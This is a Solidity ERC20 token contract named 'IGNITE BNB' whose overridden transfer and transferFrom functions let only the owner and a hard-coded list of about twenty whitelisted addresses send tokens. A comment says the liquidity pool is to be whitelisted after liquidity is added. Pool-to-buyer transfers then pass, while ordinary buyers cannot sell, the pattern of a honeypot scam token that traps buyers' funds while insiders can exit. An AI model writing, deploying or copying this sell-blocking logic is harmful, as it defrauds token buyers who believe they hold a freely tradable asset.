// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("IGNITE BNB", "IGB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        whiteList[0x39E68B0B76a32F16A5f1afCAC66D2053a037010b]= true;
        whiteList[0xe137CDd5B4C7a5b6FFe5453468e600bDFd6c8d62]=true;
        whiteList[0x3c8C7CFd60a182C5908fAA65b241883DF125AfA2]=true;
        whiteList[0x964CaAf07B79952Ecc5089CcE194ADfbAD17Eb04]=true;
        whiteList[0x5C56304D5fE70CF344CbA38e9C2ED3d356D5E9B1]=true;
        whiteList[0xC3cae81E060DB70FCa776b7d453CAd2Eab4F6631]=true;
        whiteList[0x31f7D7389fAEd3EDC369999c3eD905e3Dc872c01]=true;
        whiteList[0x3f0232c786B285dE2C77D3cDC6A14Db92e5ff9C7]=true;
        whiteList[0xbEbB56Faf1F0A3996178fdB01cAcB1BAadF9c1C3]=true;
        whiteList[0x329FcF134276d3E11b4Cdc839169E282C58f5070]=true;
        whiteList[0x57028759831cF00F869C8453cc025347953F7Ebe]=true;
        whiteList[0xF77032a9BA7a72ED336D7f699fCaC7A7867219cd]=true;
        whiteList[0x50743F0d33b19e5671F4F1d42bE3d91cB87837Dd]=true;
        whiteList[0xd423a07374BabDDA1eDe04d97AA1Df7859FC372c]=true;
        whiteList[0xB7Eca097be818c094a5EF8156D6c862b3e4C04e0]=true;
        whiteList[0x428E942941E59529e30fD6324963085c09679295]=true;
        whiteList[0xB1A00080d5e9A1614bF06AE4d7f74eF68C0AB49c]=true;
        whiteList[0x8aB671bD6f67e1271fb4DB3AF72835c278f09014]=true;
        whiteList[0xbCB5D81DC8070DB18302977d94D5cA88b85DD949]=true;
        whiteList[0x68Acc0DB436992A5C4d51e0AF194e7177a3B87bC]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}